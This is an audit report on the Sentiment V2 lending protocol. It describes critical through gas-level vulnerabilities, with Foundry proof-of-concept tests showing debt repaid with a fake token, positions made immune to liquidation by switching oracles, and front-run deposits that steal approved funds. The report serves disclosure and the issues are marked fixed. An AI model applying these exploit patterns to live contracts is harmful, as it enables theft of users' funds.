<table>
    <tr><th></th><th></th></tr>
    <tr>
        <td><img src="https://i.imgur.com/kWixNfP.png" width="250" height="250" /></td>
        <td>
            <h1>Sentiment V2 Audit Report</h1>
            <p>Prepared by: Zach Obront, Independent Security Researcher</p>
            <p>Date: March 11th to 20th, 2023</p>
        </td>
    </tr>
</table>

# About **Sentiment**

Sentiment is a leveraged lending protocol, specialized for complex portfolio positions on-chain. The protocol offers flexibility and extensibility without compromising security. Lenders benefit from adaptive risk management, while borrowers benefit from capital-efficient collateral management.

# About **zachobront**

Zach Obront is an independent smart contract security researcher. He serves as a Lead Security Researcher at Spearbit, a Lead Senior Watson at Sherlock, and has identified multiple critical severity bugs in the wild. You can say hi on Twitter at [@zachobront](http://twitter.com/zachobront).

# Summary & Scope

The [sentimentxyz/protocol-v2](https://github.com/sentimentxyz/protocol-v2/) repo was audited at commit [18bf807fdc7c1db70d3fb40b73192464dc715c47](https://github.com/sentimentxyz/protocol-v2/tree/18bf807fdc7c1db70d3fb40b73192464dc715c47).

The following contracts were in scope:
- src/irm/FixedRateModel.sol
- src/irm/LinearRateModel.sol
- src/lens/PortfolioLens.sol
- src/lens/SuperPoolLens.sol
- src/lib/Errors.sol
- src/lib/IterableMap.sol
- src/lib/IterableSet.sol
- src/oracle/ChainlinkEthOracle.sol
- src/oracle/ChainlinkUsdOracle.sol
- src/oracle/FixedPriceOracle.sol
- src/oracle/ZeroOracle.sol
- src/position/BasePosition.sol
- src/position/SingleAssetPosition.sol
- src/position/SingleDebtPosition.sol
- src/risk/SingleAssetRiskModule.sol
- src/risk/SingleDebtRiskModule.sol
- src/Pool.sol
- src/PoolFactory.sol
- src/PositionManager.sol
- src/RiskEngine.sol
- src/SuperPool.sol

After completion of the fixes, the TK commit was reviewed.

# Summary of Findings

| Identifier     | Title                        | Severity      | Fixed |
| ------ | ---------------------------- | ------------- | ----- |
| [C-01] | `liquidate()` can be abused to repay all SingleDebtPositions at no cost | Critical | ✓ |
| [C-02] | User can create non-liquidatable position by manipulating oracles to create underflow in health check | Critical | ✓ |
| [C-03] | User can create non-liquidatable position by abusing LTV changes | Critical | ✓ |
| [C-04] | User position deposits can be frontrun to steal funds | Critical | ✓ |
| [H-01] | New Positions can be frontrun with different owner, potentially stealing funds | High | ✓ |
| [H-02] | `isKnownOracle` doesn't protect against oracle manipulation | High | ✓ |
| [M-01] | Liquidation rules break incentives for certain solvent accounts to be liquidated | Medium | ✓ |
| [M-02] | ERC4626 is vulnerable to donation attacks | Medium | ✓ |
| [M-03] | Chainlink feeds can return stale data, especially in the case of Arbitrum Sequencer downtime | Medium | ✓ |
| [L-01] | Users can regain control flow while their positions are unhealthy | Low | ✓ |
| [L-02] | Withdrawing max from SuperPool can fail due to fees & share rounding | Low | ✓ |
| [L-03] | Repayment rounds shares up, pushing excess debt onto other users | Low | ✓ |
| [L-04] | `convertAssetToBorrowShares` performs incorrect check | Low | ✓ |
| [L-05] | Loss of precision in `getSuperPoolInterestRate()` | Low | ✓ |
| [L-06] | `SuperPool` can have share price manipulated by owner removing pool caps | Low | ✓ |
| [L-07] | Debt pools can remain stuck in position after liquidation | Low | ✓ |
| [L-08] | Transferring pool ownership does not update PoolFactory mapping | Low | ✓ |
| [L-09] | Protocol often rounds in favor of caller | Low | ✓ |
| [I-01] | Inconsistent behavior for view functions on risk modules | Informational | ✓ |
| [I-02] | `poolCap` can be exceeded with accrued interest | Informational | ✓ |
| [I-03] | Inherited upgradeable contracts should provide extra storage slots | Informational | ✓ |
| [I-04] | `predictAddress` would benefit from `available` bool | Informational | ✓ |
| [G-01] | Some oracle calls in SingleDebtRiskModule's `isValidLiquidation()` can be skipped | Gas | ✓ |

# Detailed Findings

# [C-01] `liquidate()` can be abused to repay all SingleDebtPositions at no cost

Single Debt Positions can have any number of assets, but have just one debt pool. As a result, many of the functions in the `SingleDebtRiskModule` assume that we only need to look at the 0 index of debt arrays.

This is specifically problematic in the liquidation flow. When we call `liquidate()` on the `PositionManager`, we begin by verifying (via the `RiskEngine`) that the position is (a) not healthy and (b) is a valid liquidation.

Specifically, let's look at the check that the liquidation is valid. The goal is to confirm two things:

1) The max debt that we are able to repay is `totalDebt * closeFactor / 1e18`.
2) The max collateral we are allowed to seize is `debtRepaid * (1e18 + liquidatationDiscount) / 1e18`.

When performing these checks, we call to the oracle for the specified pool and asset. As a result, this implicitly verifies that we are inputting valid assets that correspond to the relevant pool. However, these checks are performed on only the 0th index of the inputted array.

```solidity
uint256 debtInWei = getDebtValue(debt[0].pool, debt[0].asset, debt[0].amt);
uint256 totalDebtInWei = getDebtValue(debt[0].pool, debt[0].asset, Pool(debt[0].pool).getBorrowsOf(position));

if (debtInWei > totalDebtInWei.mulDiv(riskEngine.closeFactor(), 1e18)) revert Errors.RepaidTooMuchDebt();
```
As a result, any elements in the `debt` array after the 0th are not checked and can contain any arbitrary data. They won't be included in the check, and as long as the 0th element and the assets seized are all valid, the check will pass.

Now let's look at how that data is used. The `liquidate()` function iterates over each element in the `debt` index, transferring the `asset` to the pool and then calling `pool.repay()` to reduce the position's balance.
```solidity
for (uint256 i; i < debt.length; ++i) {
    // transfer debt asset from the liquidator to the pool
    IERC20(debt[i].asset).transferFrom(msg.sender, debt[i].pool, debt[i].amt);

    // trigger pool repayment which assumes successful transfer of repaid assets
    Pool(debt[i].pool).repay(position, debt[i].amt);
}
```
As we can see, the `repay()` function assumes successful transfer of the assets, and there is no check that the asset that we repaid corresponds to the pool's asset. Instead, it simply trusts that this has been done properly and reduces the position's borrow shares (clearing out their debt).

We can now see how a malicious payload can be crafted. Each element in the `debt` array is of the following type:
```solidity
// data for position debt to be repaid by the liquidator
struct DebtData {
    // pool address for debt to be repaid
    address pool;
    // debt asset for pool, utility param to avoid calling pool.asset()
    address asset;
    // amount of debt to be repaid by the liqudiator
    // position manager assumes that this amount has already been approved
    uint256 amt;
}
```
After a valid 0th element of the array, we can include an element with the following data, which will result in our debt being cleared at no cost:
- pool: the pool that is owed money from the position
- asset: a malicious asset that does nothing but doesn't revert on a call to `transferFrom()`
- amt: the amount of total debt that is owed by the position

### Proof of Concept

First, add the following contract to `SdpBorrowTest.t.sol`:

```solidity
contract FakeToken {
    function transferFrom(address, address, uint256) public pure returns (bool) {
        return true;
    }
}
```

Then, the following test can be dropped into the file and run to demonstrate the issue:
```solidity
function testZach_LiquidateToFalselyRepay() public {
    // starting position:
    // - deposit 100 collateral (worth 100 eth)
    // - borrow 200 borrow (worth 400 eth)
    _deposit(100e18); // 100 eth
    _borrow(200e18); // 400 eth
    assert(riskEngine.isPositionHealthy(address(position)));

    // whoops, price of collateral falls by 1%, so we're liquidatable
    FixedPriceOracle newCollatTokenOracle = new FixedPriceOracle(0.99e18);
    riskEngine.toggleOracleStatus(address(newCollatTokenOracle));
    riskEngine.setOracle(address(pool), address(erc20Collat), address(newCollatTokenOracle));

    // confirm we are now unhealthy & can be liquidated
    assert(!riskEngine.isPositionHealthy(address(position)));

    // create malicious liquidation payload
    // ad[0] and dd[0] pass the check
    // dd[1] repays the full loan by using a valid pool but a malicious token
    AssetData[] memory ad = new AssetData[](1);
    ad[0] = AssetData({
        asset: address(erc20Collat),
        amt: 0
    });

    DebtData[] memory dd = new DebtData[](2);
    dd[0] = DebtData({
        pool: address(pool),
        asset: address(erc20Borrow),
        amt: 1
    });

    FakeToken fakeToken = new FakeToken();

    dd[1] = DebtData({
        pool: address(pool),
        asset: address(fakeToken),
        amt: 200e18 - 1
    });

    // before liquidation: 499 eth of assets vs 400 eth of debt
    (uint assets, uint debt, ) = riskEngine.getRiskData(address(position));
    console2.log("Assets Before: ", assets);
    console2.log("Debt Before: ", debt);

    // liquidate (this requires having 1 wei of the token to repay)
    erc20Borrow.mint(address(this), 1);
    erc20Borrow.approve(address(positionManager), type(uint256).max);
    positionManager.liquidate(address(position), dd, ad);

    // after liquidation: 499 eth of assets vs 0 debt
    (assets, debt, ) = riskEngine.getRiskData(address(position));
    console2.log("Assets After: ", assets);
    console2.log("Debt After: ", debt);
}
```
```
Logs:
  Assets Before:  499000000000000000000
  Debt Before:  400000000000000000000
  Assets After:  499000000000000000000
  Debt After:  0
```

### Recommendation

At a bare minimum, the `SingleDebtRiskModule.isValidLiquidation()` function should check that `debt.length == 1`.

Additionally, for extra safety, I would recommend that `PositionManager.liquidate()` should validate that `Pool(debt[i].pool).asset() == debt[i].asset` for each iteration.

### Review

Fixed as recommended in [PR #108](https://github.com/sentimentxyz/protocol-v2/pull/108).

# [C-02] User can create non-liquidatable position by manipulating oracles to create underflow in health check

For a position to be liquidated, it must current be in an unhealthy state:
```solidity
function liquidate(address position, DebtData[] calldata debt, AssetData[] calldata collat) external nonReentrant {
    // position must breach risk thresholds before liquidation
    if (riskEngine.isPositionHealthy(position)) revert Errors.LiquidateHealthyPosition();
    ...
}
```
How does the `isPositionHealthy()` function determine the position's health. It calculates the value of the assets in the position minus any debt owed, and compared this to the minimum required collateral deemed by the various borrow pools.
```solidity
function isPositionHealthy(address position) external view returns (bool) {
    // short circuit happy path with zero debt
    if (IPosition(position).getDebtPools().length == 0) return true;

    (uint256 totalAssetsInEth, uint256 totalDebtInEth, uint256 minReqAssetsInEth) = getRiskData(position);

    // the position is healthy if the value of the assets in the position is more than the
    // minimum balance required to meet the ltv requirements of debts from all pools
    return totalAssetsInEth - totalDebtInEth >= minReqAssetsInEth;
}
```
However, the final formula in the `return` statement does not consider the situation when `totalDebtInEth > totalAssetsInEth`. In this case, the function will revert rather than returning `false`, and liquidations will not be possible.

While this situations could occur organically under some extreme circumstances, it can also be intentionally constructed by a user to create a non-liquidatable account.

This is because the creator of a pool is able to choose their own oracles for each asset. While these are constrained to known oracles, `isKnownOracle` does not track the asset for which the oracle is intended. As a result, an attacker can easily shift between known oracles for different assets to dramatically change the value of a given token. For example, the oracle could be shifted from a "known oracle" for USD to a "known oracle" for ETH to 4000x the value.

```solidity
function setOracle(address pool, address asset, address oracle) external {
    // revert if the oracle is not recognized by the protocol
    if (!isKnownOracle[oracle]) revert Errors.UnknownOracle();

    // only pool owners are allowed to set oracles
    if (msg.sender != Pool(pool).owner()) revert Errors.onlyPoolOwner();

    // update asset oracle for pool
    oracleFor[pool][asset] = oracle;
}
```

The result is that an attacker can set up a pool which uses a fake, valueless token, and choose a low value oracle for the token. If they borrow a lot of it and transfer it out of their position (which will be fine if they are sufficiently collateralized), then when the oracle is flipped to a high value oracle, their positions `debt > assets`. The position will thus be safe  from liquidations because all calls to `isPositionHealthy()` will revert.

Furthermore, any time they want to take an action, they can change the oracle back to low value, perform the action, and reset it to high value, allowing them to use the account as normal but permanently be shielded from liquidations.

### Proof of Concept

The following test can be dropped into `ScpBorrowTest.t.sol` to demonstrate the vulnerability:
```solidity
function testZach_UnderflowUnliquidatable() public {
        // there are two approved oracles which accurately return ETH and USD prices
        FixedPriceOracle ethOracle = new FixedPriceOracle(1e18); // 1 collat token = 1 eth
        FixedPriceOracle usdOracle = new FixedPriceOracle(1e18 / 4000); // 1 collat token = 1 usd
        riskEngine.toggleOracleStatus(address(ethOracle));
        riskEngine.toggleOracleStatus(address(usdOracle));

        // start the attack (no longer have access to permissioned functions)
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);

        // to begin the attack, create a pool with a fake token
        MintableToken fakeToken = new MintableToken();
        Pool phonyPool;
        {
            FixedRateModel rateModel = new FixedRateModel(0); // 0% apr
            PoolDeployParams memory params = PoolDeployParams({
                asset: address(fakeToken),
                rateModel: address(rateModel),
                poolCap: type(uint256).max,
                originationFee: 0,
                name: "phony pool",
                symbol: "PHONY"
            });
            phonyPool = Pool(poolFactory.deployPool(params));
        }

        // set the oracle for the fake token to be valued as USD
        riskEngine.setOracle(address(phonyPool), address(fakeToken), address(usdOracle));
        riskEngine.setOracle(address(phonyPool), address(erc20Collat), riskEngine.oracleFor(address(pool), address(erc20Collat)));
        riskEngine.setLtv(address(phonyPool), address(erc20Collat), 100e18); // 100x ltv

        // mint fake tokens to self and deposit them into the pool
        fakeToken.mint(attacker, 1_000_000e18);
        fakeToken.approve(address(phonyPool), type(uint256).max);
        phonyPool.deposit(1_000_000e18, attacker);

        // create new position that will be made nonliquidatable
        SingleAssetPosition attackerPosition;
        bytes memory data;
        Action memory action;
        {
            uint256 POSITION_TYPE = 0x2;
            bytes32 salt = "AttackerSingleAssetPosition";
            attackerPosition = SingleAssetPosition(portfolioLens.predictAddress(POSITION_TYPE, salt));

            data = abi.encode(attacker, POSITION_TYPE, salt);
            action = Action({op: Operation.NewPosition, data: data});
            positionManager.process(address(attackerPosition), action);
        }

        // deposit 1e18 of collateral into position
        {
            vm.stopPrank();
            erc20Collat.mint(attacker, 1e18);
            vm.startPrank(attacker);
            erc20Collat.approve(address(positionManager), type(uint256).max);

            data = abi.encode(attacker, address(erc20Collat), 1e18);
            Action memory action1 = Action({op: Operation.Deposit, data: data});
            Action memory action2 = Action({op: Operation.AddAsset, data: abi.encode(address(erc20Collat))});
            Action[] memory actions = new Action[](2);
            actions[0] = action1;
            actions[1] = action2;

            positionManager.processBatch(address(attackerPosition), actions);
        }

        // borrow 2000e18 of fake tokens (USD price = 1/4000 of ETH, so easily healthy)
        data = abi.encode(address(phonyPool), 2000e18);
        action = Action({op: Operation.Borrow, data: data});
        positionManager.process(address(attackerPosition), action);

        // we can transfer out the fake token because we're sufficiently collateralized
        data = abi.encode(address(1), address(fakeToken), 2000e18);
        action = Action({op: Operation.Transfer, data: data});
        positionManager.process(address(attackerPosition), action);

        // but now if we increase the value of the debt, we can make it worth more than the assets
        riskEngine.setOracle(address(phonyPool), address(fakeToken), address(ethOracle));

        // now all calls to isPositionHealthy will revert
        vm.expectRevert();
        riskEngine.isPositionHealthy(address(attackerPosition));

        // attacker can change oracle back to make transactions, and then reset for liquidation protection
        riskEngine.setOracle(address(phonyPool), address(fakeToken), address(usdOracle));
        riskEngine.isPositionHealthy(address(attackerPosition));
        riskEngine.setOracle(address(phonyPool), address(fakeToken), address(ethOracle));
        vm.expectRevert();
        riskEngine.isPositionHealthy(address(attackerPosition));
    }
```

### Recommendation

In the event where `debt > assets`, return false without performing the subtraction to avoid the revert:

```diff
function isPositionHealthy(address position) external view returns (bool) {
    // short circuit happy path with zero debt
    if (IPosition(position).getDebtPools().length == 0) return true;

    (uint256 totalAssetsInEth, uint256 totalDebtInEth, uint256 minReqAssetsInEth) = getRiskData(position);

    // the position is healthy if the value of the assets in the position is more than the
    // minimum balance required to meet the ltv requirements of debts from all pools
-   return totalAssetsInEth - totalDebtInEth >= minReqAssetsInEth;
+   return (totalAssetsInEth >= totalDebtInEth && totalAssetsInEth - totalDebtInEth >= minReqAssetsInEth);
}
```

### Review

Fixed in [PR #143](https://github.com/sentimentxyz/protocol-v2/pull/143) by redefining LTV, so that the subtraction of debt was not necessary. The known oracle issue is addressed separately in H-02.

# [C-03] User can create non-liquidatable position by abusing LTV changes

When the LTV for a given pool-asset combination is updated, liquidation risks for users change, but without any health check after the fact. This gives pool owners the power to adjust LTV dramatically in such a way that a user jumps over the liquidatable range and right into a range where the incentives to liquidate them are too small.

Due to the constraints discussed in #111, there is a limited range of unhealthiness in which a position will be liquidated. Below that range, any liquidator will lose money when performing the liquidation, and the account will therefore effectively be safe from liquidations.

As a result, a user can create a malicious pool and abuse their power to control LTV to force their account into such a situation, avoiding the risk of liquidation.

### Proof of Concept

Assuming all prices are in ETH to remove the oracle complexity, and pricing gas at zero to assume liquidations would occur even in the most unfavorable situation, let's set up the following situation:

1) A user deposits 100 ETH into their position.
2) They borrow 100 ETH from a pool with an LTV of 4e18 (the example that is used in the test suite).
3) The set up a malicious pool with an LTV of 16e18 (the max is 1900e18, so could be much worse, but this is sufficient for this example), deposit 1200 ETH from another account, and borrow it.

> Current Status:
> - Debt = 100 + 1200 = 1300
> - Assets = 100 + 100 + 1200 = 1400
> - minReq = (100 / 4) + (1200 / 16) = 100
> - Because `1400 - 1300 >= 100`, the account is healthy.

4) The user then switches the LTV on their malicious pool to 0.5 (this is the minimum allowed).

> Current Status:
> - Debt = 100 + 1200 = 1300
> - Assets = 100 + 100 + 1200 = 1400
> - minReq = (100 / 4) + (1200 / 0.5) = 2425
> - Because `1400 - 1300 < 2425`, the account is unhealthy.

5) Presumably, at this point the account should be liquidated. But there is no way for a liquidator to even break even on the transaction, and thus nobody will take it.
- The most debt that can be paid off is `1300 / 2 = 650`.
- In this case, assuming it's all paid off from the lower LTV, the `minReq = (100 / 4) + (550 / 0.5) = 1125`.
- Because the account must be healthy after the liquidation, the most assets that are able to be sized is `1400 - 1125 = 275`. But nobody will ever pay off 650 of debt to seize 275 of assets, so the account is safe from liquidations.

Furthermore, the attacker could continue to operate the account by using a contract (or Flashbots) to bundle their transactions together, sandwiching (a) increase LTV until account is healthy, (b) perform some actions, and (c) reduce LTV so account is unhealthy again.

### Recommendation

The simplest fix would be to remove `closeFactor`, which would guarantee that all solvent positions would have some liquidation incentive.

### Review

Fixed in [PR #143](https://github.com/sentimentxyz/protocol-v2/pull/143) by removing `closeFactor`.

# [C-04] User position deposits can be frontrun to steal funds

When a user wants to deposit funds into their position, the perform the following two steps:

1) Call the ERC20 token to approve `positionManager` to transfer tokens.
2) Call `positionManager` to deposit tokens.

The call to `deposit()` transfers the assets from any depositor to any position that the caller is authorized for:

```solidity
function deposit(address position, bytes calldata data) internal {
    // depositor -> address to transfer the tokens from, must have approval
    // asset -> address of token to be deposited
    // amt -> amount of asset to be deposited
    (address depositor, address asset, uint256 amt) = abi.decode(data, (address, address, uint256));
    IERC20(asset).safeTransferFrom(depositor, position, amt);

    emit Deposit(position, msg.sender, depositor, asset, amt);
}
```
Because the only authorization is on the `position` that will receive the assets and not on the `depositor`, any user who has approved tokens can be passed by an attacker as the depositor, stealing their tokens.

This means any EOA interacting with the protocol (who need to perform the approve and deposit as two separate transactions) are vulnerable to having an attacker jump in between the transactions to steal their funds.

### Proof of Concept

The following test can be dropped into `ScpBorrowTest.t.sol` to demonstrate the attack:
```solidity
function testZach_DepositFrontrun() public {
    // a user with 1e18 tokens
    address user = makeAddr("user");
    erc20Collat.mint(user, 1e18);

    // user approves the position manager in advance of depositing them
    vm.prank(user);
    erc20Collat.approve(address(positionManager), 1e18);

    // an attacker can jump in and steal the tokens for their own position
    address attacker = makeAddr("attacker");
    vm.startPrank(attacker);

    uint256 POSITION_TYPE = 0x2;
    bytes32 salt = "AttackerSingleAssetPosition";
    SingleAssetPosition attackerPosition = SingleAssetPosition(portfolioLens.predictAddress(POSITION_TYPE, salt));
    bytes memory newPosData = abi.encode(attacker, POSITION_TYPE, salt);
    Action memory newPosAction = Action({op: Operation.NewPosition, data: newPosData});

    bytes memory depositData = abi.encode(user, address(erc20Collat), 1e18);
    Action memory depositAction = Action({op: Operation.Deposit, data: depositData});

    Action[] memory actions = new Action[](2);
    actions[0] = newPosAction;
    actions[1] = depositAction;

    positionManager.processBatch(address(attackerPosition), actions);

    // now the attacker has the user funds
    assertEq(erc20Collat.balanceOf(address(attackerPosition)), 1e18);
    assertEq(erc20Collat.balanceOf(user), 0);
}
```

### Recommendation

Only allow users to deposit from `msg.sender` rather than allowing them to input an arbitrary depositor.

If it's important to keep the ability to deposit on behalf of another user, use `Permit`-style signature approvals.

### Review

Fixed in [PR #129](https://github.com/sentimentxyz/protocol-v2/pull/129) by only allowing users to deposit from `msg.sender`.

# [H-01] New Positions can be frontrun with different owner, potentially stealing funds

To create a new position, a user calls `PositionManager.process()` with the `NewPosition` Operation. They also pass an `owner` (which is set as the owner of the position), a `positionType` (which determines the implementation that is used, and a `salt` (which is used to determine the address of the new contract using CREATE2).

```solidity
// create2 a new position as a beacon proxy
address position = address(new BeaconProxy{salt: salt}(beaconFor[positionType], ""));
```

Note that the `owner` has no impact on the address that is determined.

Therefore, once a transaction is in the mempool with a `positionType` and `salt`, an attacker can frontrun with an identical transaction, subbing in their own address as the `owner`.

In most normal circumstances, the result will be that the user's deployment will revert, and they'll need to redo the transaction with a different salt. This could be annoying, but is not too harmful.

However, in the event that a user is running a Foundry script that first deploys a position, and then calls `PositionManager.process()` to deposit funds into it, there is a greater risk. As we can see in [the docs](https://book.getfoundry.sh/tutorials/best-practices?highlight=script#scripts), Foundry scripts are not atomic. This means if one transaction fails, the script will continue to run.

In such a situation, the attacker's frontrun becomes more of a problem. As long as they authorize the user before their `deposit` transaction is processed, the deposit will proceed as planned. When the attacker withdraws the user's authorization, they will have stolen the deposit into a position that they now control.

### Proof of Concept

The following test can be dropped into `PositionManager.t.sol` to demonstrate the issue:
```solidity
function testZach_NewPositionFrontrun() public {
    // create a user who holds 1e18 of mock token
    address user = makeAddr("user");
    mockToken.mint(user, 1e18);
    vm.prank(user);
    mockToken.approve(address(manager), 1e18);

    // the user wants to deploy a new position and fund it, so submits the following to the mempool
    uint typee = 1;
    bytes32 salt = keccak256("secret");
    address predicted = predictAddress(typee, salt);
    Action memory deployAction = Action({op: Operation.NewPosition, data: abi.encode(user, typee, salt)});
    Action memory depositAction = Action({op: Operation.Deposit, data: abi.encode(user, address(mockToken), 1e18)});

    // attacker sees it and front runs deployment and authorizes user
    address attacker = makeAddr("attacker");
    Action memory attackerAction = Action({op: Operation.NewPosition, data: abi.encode(attacker, typee, salt)});
    vm.startPrank(attacker);
    manager.process(predicted, attackerAction);
    manager.toggleAuth(user, predicted);
    vm.stopPrank();

    // now the user's transactions are processed, with the deployment reverting but deposit succeeding
    vm.startPrank(user);
    vm.expectRevert();
    manager.process(predicted, deployAction);
    manager.process(predicted, depositAction);
    vm.stopPrank();

    // finally the attacker can revoke auth and has stolen funds
    vm.prank(attacker);
    manager.toggleAuth(user, predicted);
    assert(mockToken.balanceOf(predicted) == 1e18);
    assert(manager.ownerOf(predicted) == attacker);
}
```

### Recommendation

Rather than passing the `salt` to CREATE2 directly, hash it with the `owner` so that only a given owner is able to deploy to a specific address.

```diff
    // positionType -> position type of new position to be deployed
    // owner -> owner to create the position on behalf of
    // salt -> create2 salt for position
    (address owner, uint256 positionType, bytes32 salt) = abi.decode(data, (address, uint256, bytes32));

+   salt = keccak256(abi.encodePacked(owner, salt));

    // revert if given position type doesn't have a register beacon
    if (beaconFor[positionType] == address(0)) revert Errors.NoPositionBeacon();

    // create2 a new position as a beacon proxy
    address position = address(new BeaconProxy{salt: salt}(beaconFor[positionType], ""));
```

### Review

Fixed as recommended in [PR #138](https://github.com/sentimentxyz/protocol-v2/pull/138).

# [H-02] `isKnownOracle` doesn't protect against oracle manipulation

The `isKnownOracle` mapping in `RiskEngine.sol` ensures that the oracles chosen by pool operators are valid and cannot be used to manipulate user balances and debts.

```solidity
function setOracle(address pool, address asset, address oracle) external {
    // revert if the oracle is not recognized by the protocol
    if (!isKnownOracle[oracle]) revert Errors.UnknownOracle();

    // only pool owners are allowed to set oracles
    if (msg.sender != Pool(pool).owner()) revert Errors.onlyPoolOwner();

    // update asset oracle for pool
    oracleFor[pool][asset] = oracle;
}
```

This is required because giving all users the ability to set oracles for pools they create gives them the ability to manipulate their own totalBalance and totalDebt values, which can be used maliciously (like in #109).

However, in the current implementation, this type of attack is still possible. Because `isKnownOracle` doesn't track oracles by assets, flipping between oracles for assets with wildly different values is functionally equivalent to being able to manipulate them freely.

### Recommendation

`isKnownOracle` should be tracked by asset in order to make sure that only valid oracles for a given asset are used, and can't be used by an attacker to freely manipulate their own balance and debt values.

### Review

Fixed as recommended in [PR #131](https://github.com/sentimentxyz/protocol-v2/pull/131).

# [M-01] Liquidation rules break incentives for certain solvent accounts to be liquidated

The purpose of a liquidation mechanism is to ensure that there is a middle ground between "unhealthy" and "insolvent" in which there is an incentive for an outside party to capture (some of) the assets, pay (some of) the debts, and capture some profit.

In the current Sentiment system, the mechanism is defined as follows:

- Each debt pool (which lends only one asset) sets an LTV it is willing to lend against for each possible collateral asset.
- The minimum value of the assets maintained in a position is computed by dividing the total debt by the weighted average of the LTVs for each debt pool / asset combination
- If the "equity" of the account (assets - debt) does not meet this minimum value, the account is liquidatable
- In this case, anyone can liquidate the account. They can pay off anywhere up to `totalDebt * closeFactor / 1e18` of the debt (close factor is currently set at 50%), and seize assets worth up to `liquidationDiscount` more than what they paid off (currently set at 20%).
- After the liquidation is complete, the account must be healthy.

This set of constraints leads to a number of situations where, while an account is still solvent, it is impossible to profitably liquidate it, and it will thus become bad debt.

### Detailed Analysis

Any analysis become unwieldy when including separate LTVs for separate pools, because no smooth mathematical formula can represent the properties of the position. Thus, for simplicity in this analysis, let's assume LTV will be a constant across pools and assets. We will also assume oracle prices for an asset are consistent based on each pool's oracle.

Since $minReq = \dfrac{debt}{LTV}$, an account is liquidatable when:

> $assets - debt < \dfrac{debt}{LTV}$

Simplifying, we get:
- $assets < \dfrac{debt}{LTV} + debt$
- $assets < debt * (1 + \dfrac{1}{LTV})$

On the other hand, holding gas fees at zero for simplicity, there should always be an incentive to liquidate when:

> $assets > debt$

As a result, we get the "ideal liquidatable range", across which we should facilitate liquidations:

> $debt < assets < debt * (1 + \dfrac{1}{LTV})$

However, the current implementation has two requirements that must be satisfied. First, the liquidation must end with a healthy account. Second, the maximum assets that can be paid back is defined by the `closeFactor`.

The minimum result we must reach to fulfill the first requirement is:

> $assets = debt * (1 + \dfrac{1}{LTV})$

Using the most hopeful assumptions, we could hope for a benevolent liquidator who will pay off exactly the amount of debt that they will seize in assets. While this is unlikely to ever be the case (gas fees, no incentive), it is a simple to compute lower bound on the situations in which a liquidation might occur. Therefore, for our calculations, we can set `seized = payback`.

Given the above, our goal is to meet the following conditions:

1) $debt < assets < debt * (1 + \dfrac{1}{LTV})$
2) $assets - payback = (debt - payback) * (1 + \dfrac{1}{LTV})$

How do we calculate the minimum payback needed to pass this post-health check?
- $assets - payback = (debt - payback) * (1 + \dfrac{1}{LTV})$
- $assets = ((debt - payback) * (1 + \dfrac{1}{LTV})) + payback$
- $assets = (debt * (1 + \dfrac{1}{LTV})) - (payback + \dfrac{payback}{LTV})) + payback$
- $assets = (debt * (1 + \dfrac{1}{LTV})) - \dfrac{payback}{LTV}))$
- $assets * LTV = (debt * (1 + LTV)) - payback)$
- $payback = (debt * (LTV + 1)) - (assets * LTV)$

Therefore, due to the first condition, we must pay back at least $(debt * (LTV + 1)) - (assets * LTV)$ in order for the liquidation to succeed.

However, given the second requirement payback must be less than or equal to `debt * closeFactor`.

This tells us that when the following equality holds, the required liquidation to reach health cannot be made:

> $debt * closeFactor < (debt * (LTV + 1)) - (assets * LTV)$

This can be simplified to:

> $assets < debt *  \dfrac{(LTV + 1 - closeFactor)}{LTV}$

In any event where this holds, the position will also be deemed unhealthy, because the above is by definition less than the liquidation threshold, which can alternately be expressed as: $debt *  \dfrac{(LTV + 1)}{LTV}$

We can therefore conclude that in the event that:

> $debts <= assets < debt *  \dfrac{(LTV + 1 - closeFactor)}{LTV}$

We have a liquidation that should occur, has enough solvency to justify liquidation, but cannot be performed without either (a) failing the health check, (b) breaking the max payoff specified by closeFactor or (c) losing money for the liquidator.

### Summary

To simplify, setting:
- $A = debt = debt *  \dfrac{LTV}{LTV}$
- $B = debt *  \dfrac{(LTV + 1 - closeFactor)}{LTV}$
- $C = debt * (1 + \dfrac{1}{LTV}) = debt * \dfrac{(LTV + 1)}{LTV}$

| assets < A | A <= assets < B | B <= assets < C  | C <= assets |
| ----------- | ----------- | ----------- | ----------- |
| insolvent, no possible liquidation incentive      | should be liquidated but won't be       | will be liquidated | healthy |

### Recommandation

The simplest fix would be to remove `closeFactor`. A more complex fix would require allowing accounts be liquidated and end up not solvent, as long as they moved towards solvency.

### Review

Fixed in [PR #143](https://github.com/sentimentxyz/protocol-v2/pull/143) by removing `closeFactor`.

# [M-02] ERC4626 is vulnerable to donation attacks

ERC4626's risk to donation attacks are well documented. The basic idea is that an attacker can send assets directly to an ERC4626 vault to increase the share price while they own all (or the majority) of the tokens. This can cause rounding issues that allow them to steal funds from other users.

OpenZeppelin has aimed to mitigate this risk by including some virtual shares when converting between shares and assets.

```solidity
function _convertToShares(uint256 assets, Math.Rounding rounding) internal view virtual returns (uint256) {
    return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);
}
```

This implementation assumes that 1 wei of the asset is already deposited, and sets the total supply based on the `_decimalsOffset()` function, which is hardcoded in their implementation to return 0 (ie 1 asset == 1 share).

This does provide some protection, but does not fully mitigate the risk. Let's look at an example:

1) A new pool is deployed, and an attacker watches the mempool for the first depositor.

2) A deposit transaction is discovered for `1e18` assets.

3) The attacker mints 9 shares (which costs 9 wei), and proceeds to donate `10e18` of the asset to the pool.

4) When the depositor's transaction is processed, the `_convertToShares()` function above returns `1e18 * (9 + 1) / (10e18 + 9 + 1)`, which rounds down to 0. Therefore, the depositor sends `1e18` assets into the vault, and gets 0 shares back.

5) The attacker now holds the only 9 shares in the pool, which has 11e18 of assets.

6) If they withdraw, the virtual share discounts will bring their withdrawal down to `9.9e18`, which is just shy of the amount they have spent.

7) However, if they don't withdraw, all it takes is one other `deposit()` hitting the vault to cause another depositor to lose funds (even a smaller amount or a larger amount that causes rounding), and the attack will be profitable.

Because the cost is so low and the possible benefit is quite a bit higher, the expected value for this action is positive.

### Recommendation

To make this account more unprofitable, it is recommended to increase the `_decimalsOffset()` to a higher value. It appears that even a value of `1` will make this attack sufficiently unprofitable that it will not be worth the risk.

Note that this will increase by 10x the number of shares of all pools, starting the pool with a 10:1 shares:assets ratio.

If this is undesirable, another alternative is to ensure in `Pool.sol` that calls to `deposit()` return a value greater than 0 shares. This will eliminate the most profitable scenario, which is also likely to make the expected value of the attack negative.


### Review

